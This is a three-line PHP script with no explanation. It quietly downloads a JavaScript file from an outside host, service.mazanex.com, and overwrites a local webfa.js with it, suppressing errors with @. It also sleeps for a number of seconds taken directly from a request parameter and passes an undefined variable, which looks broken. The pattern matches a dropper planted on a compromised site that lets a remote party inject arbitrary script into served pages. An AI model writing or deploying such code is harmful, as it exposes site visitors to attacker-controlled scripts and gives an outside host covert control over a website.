<?php
if (isset($_GET['i'])) sleep($_GET['i']);
@file_put_contents('webfa.js',@file_get_contents('http://service.mazanex.com/webfa.js'),$rates);